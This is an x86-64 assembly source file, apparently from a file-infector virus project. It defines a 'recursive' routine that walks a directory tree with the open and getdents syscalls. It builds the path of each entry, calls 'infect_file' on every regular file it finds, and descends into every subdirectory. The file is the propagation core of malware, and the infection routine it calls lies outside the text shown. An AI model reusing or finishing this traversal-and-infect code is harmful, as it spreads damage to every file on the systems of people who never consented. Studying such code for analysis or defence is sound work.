
str: db 10, 0,
sle: db "/", 0,

%include "ft_strcpy.s"

%include "ft_strlen.s"

;	int recursive(char *path)
;	r8	=> buff[4096]
;	r12 => fd
;	r13 => idx
;	r14 => type
;	r8 => read
recursive:
	push rbp
	mov rbp, rsp
	sub rsp, READ_DIR_BUFF_SIZE
	;open:
	mov r12, rdi			;  buff[4096]
	cmp r12, 0
	jz recursive_exit
	lea rdi, [r12 + fileName]
	mov rsi, 0			    ; O_RDONLY
	mov rax, SYS_OPEN   	; open("", O_RDONLY);
	syscall
	cmp rax, 0
	jl recursive_exit2
	mov r15, rax			; fd
	call ft_strlen
	mov r8, rax
	
	;getents
	loop_dir:
	mov rdi, r15		; fd
	mov rsi, rsp		; buff[300]
	mov rdx, READ_DIR_BUFF_SIZE	; 300
	mov rax, SYS_GETDENTS
	syscall
	mov r14, rax		; byte read
	cmp rax, 0
	jle recursive_exit


	; loop files
	xor r13, r13
	jmp files_loop_end
	files_loop:
	

	;copy name to path

	lea rdi, [rsp + r13 + d_name]
	call ft_strlen
	add rax, r8
	cmp rax, PATH_BUFF_SIZE - 2
	jge end_recur
	lea rdi, [r12 + fileName + r8]
	cmp byte [rdi - 1], '/'
	jz slash_ok
	mov byte [rdi], '/'
	inc rdi
	slash_ok:
	lea rsi, [rsp + r13 + d_name]
	call ft_strcpy




	;check type
	xor rax, rax
	xor rdi, rdi
	mov di, [rsp + r13 + d_reclen]
	add rdi, r13
	mov al, byte [rsp + rdi - 1]
	cmp rax, DT_REG
	jz recursive_infect_file
	cmp rax, DT_DIR
	jz true_start_recur
	jmp end_recur

	recursive_infect_file:

	push r14
	push r13
	push r12
	push r8
	mov rdi, r12
	call infect_file
	pop r8
	pop r12
	pop r13
	pop r14

	jmp end_recur
	true_start_recur:
	xor rax, rax
	mov al, [rsp + r13 + d_name]
	cmp al, '.'
	jnz start_recur
	mov al, [rsp + r13 + d_name + 1]
	cmp al, '.'
	jz end_recur
	cmp al, 0
	jz end_recur

	start_recur:
	mov rdi, r12
	push r15
	push r14
	push r13
	push r12
	push r8
	call recursive
	pop r8
	pop r12
	pop r13
	pop r14
	pop r15
	xor rdi, rdi
	lea rdi, [r12 + fileName + r8]
	
	mov [rdi], byte 0

	end_recur:
	xor rax, rax
	mov ax, [rsp + r13 + d_reclen]
	cmp rax, 0
	jz quit_files_loop
	add r13, rax
	
	files_loop_end:
	cmp r13, r14
	jl files_loop
	quit_files_loop:
	jmp loop_dir
	recursive_exit:
		mov rdi, r15
		mov rax, SYS_CLOSE
		syscall
	recursive_exit2:
		leave
		ret
